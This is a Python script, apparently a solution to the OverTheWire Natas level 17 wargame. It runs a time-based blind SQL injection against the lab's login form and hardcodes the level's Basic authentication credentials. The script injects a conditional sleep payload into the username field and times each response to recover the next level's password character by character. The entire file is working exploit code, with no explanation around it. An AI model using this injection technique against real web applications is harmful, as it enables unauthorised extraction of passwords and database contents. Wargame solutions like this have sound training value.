#! /bin/python3

import requests
import time

str1 = "natas18\" and if (password like binary \""
str2 = "%\", sleep(5), null) #"

def urlconn(var) :
    url = 'http://natas17.natas.labs.overthewire.org/index.php'
    headers = {'Authorization' : 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
    username = str1 + var + str2
    payload = {'username' : username}
    start = time.time()

    r = requests.post(url,headers=headers, data=payload)
    rtt = time.time() - start
    if rtt > 5 :
        return True
    else :
        return False
    


lst = 'abcdefghijklmnopqrstuvwxyz123334567890ABCDEFGHIJKLMNOPQRSTUVWXYZ-'
passwd = ''

for i in range(50) :
    for j in lst :
        passwd1 = passwd + j
        print (passwd1)
        result = urlconn(passwd1)
        if result :
            passwd = passwd + j
            break
        if j == '-' :
            exit()
        



